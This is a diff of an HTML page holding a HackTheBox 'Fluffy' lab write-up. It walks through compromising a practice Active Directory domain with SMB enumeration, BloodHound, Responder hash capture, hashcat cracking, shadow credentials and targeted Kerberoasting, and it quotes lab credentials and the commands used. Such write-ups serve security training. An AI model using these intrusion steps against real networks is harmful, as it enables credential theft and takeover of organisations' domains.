@@ -1,56 +1,49 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HackTheBox - Fluffy</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            line-height: 1.6;
-            margin: 0;
-            padding: 20px;
-            background-color: #f5f5f5;
-        }
-        h1, h2, h3, h4, h5, h6 {
-            color: #2c3e50;
-        }
-        code, pre {
-            background-color: #eaeaea;
-            padding: 5px;
-            border-radius: 4px;
-            display: block;
-            white-space: pre-wrap;
-        }
-        img {
-            max-width: 100%;
-            margin: 10px 0;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-        }
-        .section {
-            background-color: #fff;
-            padding: 15px 20px;
-            margin-bottom: 20px;
-            border-radius: 8px;
-            box-shadow: 0 2px 6px rgba(0,0,0,0.1);
-        }
-        ul {
-            padding-left: 20px;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="HackTheBox Fluffy Writeup by Rachel Murphy" />
+  <title>HTB: Fluffy | Rachel Murphy</title>
+
+  <!-- Base site styling -->
+  <link rel="stylesheet" href="/../../assets/css/writeups.css">
+      <script src="/assets/css/js/script.js" defer></script>
+
 </head>
 <body>
 
-<div class="section">
-<h1>Release Arena</h1>
-<p><strong>IP:</strong> 10.10.11.69</p>
-<img src="images/Pasted image 20250915181446.png" alt="Release Arena Screenshot">
+  <!-- Header -->
+  <header>
+    <h1>Fluffy Writeup</h1>
+    <p>HackTheBox Labs</p>
+    <nav>
+      <ul>
+        <li><a href="../../index.html">Home</a></li>
+        <li><a href="../index.html">Writeups</a></li>
+        <li><a href="../../cheatsheets/index.html">Cheatsheets</a></li>
+        <li><a href="../../tools/index.html">Tools</a></li>
+        <li><a href="../../about.html">About</a></li>
+      </ul>
+    </nav>
+  </header>
 
-<h2>Autorecon</h2>
-<pre><code>autorecon -t ip.txt -vvv --ignore-plugin-checks</code></pre>
+  <main>
 
-<h2>NMAP</h2>
+    <section class="section">
+      <h2>Release Arena</h2>
+      <img src="images/Pasted image 20250915181446.png" alt="Release Arena Screenshot">
+
+      <p><strong>Description:</strong><br>
+
+      <code>Fluffy</code> is an easy Windows machine designed around an assumed breach scenario. Initial credentials are provided for a low-privileged user. Exploiting <a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24071" target="_blank">CVE-2025-24071</a> allows obtaining credentials for another low-privileged user. Enumeration uncovers ACLs on the <code>winrm_svc</code> and <code>ca_svc</code> accounts. Using WinRM with <code>winrm_svc</code> and exploiting the Active Directory Certificate Service (ESC16) with <code>ca_svc</code> ultimately leads to Administrator access.</p>
+
+      <p><strong>IP:</strong> 10.10.11.69</p>
+
+      <h3>Autorecon</h3>
+      <pre><code>autorecon -t ip.txt -vvv --ignore-plugin-checks</code></pre>
+
+<h3>NMAP</h3>
 <img src="images/Pasted image 20250915202202.png" alt="NMAP Scan">
 <ul>
     <li>53,88,139,389,445,464,593,636, 5985 other LDAP ports and RPC ports</li>
@@ -58,42 +51,42 @@
     <li><code>Domain: fluffy.htb</code> <code>DNS: DC01.fluffy.htb</code> → Add to <code>/etc/hosts</code></li>
 </ul>
 
-<h2>SMB (445)</h2>
+<h3>SMB (Port: 445)</h3>
 
-<h3>NXC with given creds</h3>
+<h4>Enumerate SMB shares with given creds</h4>
 <pre><code>j.fleischman / J0elTHEM4n1990!</code></pre>
 
 <pre><code></code>nxc smb fluffy.htb -u 'j.fleischman' -p 'J0elTHEM4n1990!' --shares</code></pre>
 <img src="images/IT-share-fluffy.png" alt="NXC shares output">
-<p>Has read/write access to IT share.</p>
+<p>Initial access user has read/write access to IT share.</p>
 
-<h3>smbclient</h3>
+<h4>Enumerate IT share</h4>
 <pre><code>smbclient -U 'j.fleischman' //10.10.11.69/IT</code></pre>
-<img src="images/Pasted image 20250915212201.png" alt="smbclient access">
+<img src="images/access-smb-share-fluffy-smbclient.png" alt="smbclient access">
 <p>Grab all files:</p>
 <pre><code>mget *</code></pre>
 <img src="images/Pasted image 20250915212310.png" alt="Downloading files">
 
-<h3>Testing initial access creds for WinRM</h3>
+<h4>Testing initial access creds for WinRM as well</h4>
 <pre><code>nxc winrm fluffy.htb -u 'j.fleischman' -p 'J0elTHEM4n1990!'</code></pre>
 <img src="images/Pasted image 20250915212929.png" alt="WinRM test failed">
 
-<h3>SMB Share Files</h3>
+<h4>SMB Share Files</h4>
 
-<h4>KeePass Zip</h4>
+<h5>KeePass Zip</h5>
 <img src="images/Pasted image 20250915212746.png" alt="KeePass zip contents">
 <p>Unzipped, not password-protected. Likely just the software download.</p>
 
-<h4>Exploit libraries</h4>
-<img src="images/Pasted image 20250915213218.png" alt="Exploit libraries">
+<h5>Exploit libraries</h5>
+<img src="images/contents-it-share-fluffy.png" alt="Exploit libraries">
 
-<h4>Upgrade_Notice.pdf</h4>
-<img src="images/Pasted image 20250915213343.png" alt="Upgrade notice vulnerabilities">
+<h5>Upgrade_Notice.pdf</h5>
+<img src="images/cves-fluffy.png" alt="Upgrade notice vulnerabilities">
 <p>Contains a table of recent vulnerabilities. Another email found: <code>infrastructure@fluffy.htb</code></p>
 <img src="images/Pasted image 20250915213511.png" alt="Infrastructure email">
 <p>Admin maintenance notice.</p>
 
-<h4>Sample CVEs</h4>
+<h5>Researching CVEs listed in the PDF</h5>
 <ul>
     <li><strong>CVE-2025-24996</strong> – External control of file name/path in NTLM → spoofing over network. <a href="https://cwe.mitre.org/data/definitions/73.html">Reference</a></li>
     <li><strong>CVE-2025-21193</strong> – Active Directory Federation Server Spoofing</li>
@@ -102,14 +95,15 @@
 <img src="images/Pasted image 20250915213711.png" alt="CVE-2025-24996">
 <img src="images/Pasted image 20250915214346.png" alt="CVE-2025-21193">
 
-<h3>Everything Zip & Executables</h3>
+<h4>Everything Zip & Executables</h4>
+<p>Enumerating the files within everything.zip to see if there's anything to further inform initial access.</code></p>
 <img src="images/Pasted image 20250915214636.png" alt="Everything zip">
 <img src="images/Pasted image 20250915214621.png" alt="Everything zip contents">
 <img src="images/Pasted image 20250915215539.png" alt="Share path">
 <p>Transferred <code>everything.exe</code> to Windows VM. File viewer in PE Bear shows version 1.4.1.1026.</p>
 <img src="images/Pasted image 20250916205310.png" alt="everything.exe in PE Bear">
 
-<h3>BloodHound Enumeration</h3>
+<h4>BloodHound Enumeration</h4>
 <pre><code>python3 bloodhound.py -ns 10.10.11.69 -d fluffy.htb -dc dc01.fluffy.htb -u 'j.fleischman' -p 'J0elTHEM4n1990!' -c All</code></pre>
 <img src="images/initial-bloodhound-fluffy.png" alt="BloodHound initial">
 <img src="images/Pasted image 20250918101753.png" alt="BloodHound upload">
@@ -120,13 +114,13 @@
 <img src="images/Pasted image 20250918111354.png" alt="LDAP_SVC permissions">
 <img src="images/Pasted image 20250918111513.png" alt="j.coffey access">
 
-<h3>Replacing executables / Reverse Shell</h3>
+<h4>Replacing executables / Reverse Shell</h4>
 <p>Attempted MSF reverse shell via <code>everything.exe</code>. Listener, upload, etc. Didn’t work.</p>
 <img src="images/Pasted image 20250918140540.png" alt="MSF reverse shell">
 <img src="images/Pasted image 20250918140634.png" alt="Uploaded rev shell">
 <img src="images/Pasted image 20250918143719.png" alt="Alternate exec attempt">
 
-<h3>Responder NTLM Relay</h3>
+<h4>Responder NTLM Relay</h4>
 <pre><code>sudo responder -I tun0</code></pre>
 <img src="images/Pasted image 20250918144426.png" alt="Responder setup">
 <img src="images/Pasted image 20250918144346.png" alt="Obtained p.agila hash">
@@ -135,18 +129,18 @@
 [SMB] NTLMv2-SSP Hash     : ...</code></pre>
 <img src="images/Pasted image 20250918145928.png" alt="Hash file">
 
-<h3>Hashcat Cracking</h3>
+<h4>Hashcat Cracking</h4>
 <pre><code>hashcat hash /usr/share/wordlists/rockyou.txt</code></pre>
 <p>Cracked: <code>prometheusx-303</code></p>
 <img src="images/Pasted image 20250918145857.png" alt="Hash cracked">
 
-<h3>Access Testing</h3>
+<h4>Access Testing</h4>
 <pre><code>nxc smb fluffy.htb -u 'p.agila' -p 'prometheusx-303'</code></pre>
 <img src="images/Pasted image 20250918150221.png" alt="NXC login p.agila">
 <p>WinRM not remote user.</p>
 <img src="images/Pasted image 20250918150302.png" alt="WinRM test failed">
 
-<h3>BloodHound / Service Accounts</h3>
+<h4>BloodHound / Service Accounts</h4>
 <img src="images/Pasted image 20250918150426.png" alt="Peter service account manager">
 <img src="images/Pasted image 20250918150459.png" alt="Service accounts details">
 
@@ -156,11 +150,11 @@
 <pre><code>net rpc group members "Service Accounts" -U fluffy.htb/"p.agila"%"prometheusx-303" -S "dc01.fluffy.htb"</code></pre>
 <img src="images/Pasted image 20250918152245.png" alt="Verify group membership">
 
-<h3>PyWhisker</h3>
+<h4>PyWhisker</h4>
 <pre><code>pywhisker.py -d "fluffy.htb" -u "p.agila" -p "prometheusx-303" --target "winrm_svc" --action "add"</code></pre>
 <img src="images/Pasted image 20250918152950.png" alt="PyWhisker attempt">
 
-<h3>Targeted Kerberoast</h3>
+<h4>Targeted Kerberoast</h4>
 <pre><code>python3 targetedKerberoast.py -v -d 'fluffy.htb' -u 'p.agila' -p 'prometheusx-303' --request-user 'winrm_svc'</code></pre>
 <img src="images/Pasted image 20250918153538.png" alt="Kerberoast successful">
 
@@ -219,6 +213,12 @@
 </ul>
 
 </div>
+
+  <!-- Footer -->
+  <footer>
+    <p>© Rachel Murphy 2025 | <a href="https://github.com/rachhavoc">GitHub</a></p>
+    <p><a href="/../index.html">Back to Writeups</a> | <a href="../../index.html">Home</a></p>
+  </footer>
 
 </body>
 </html>
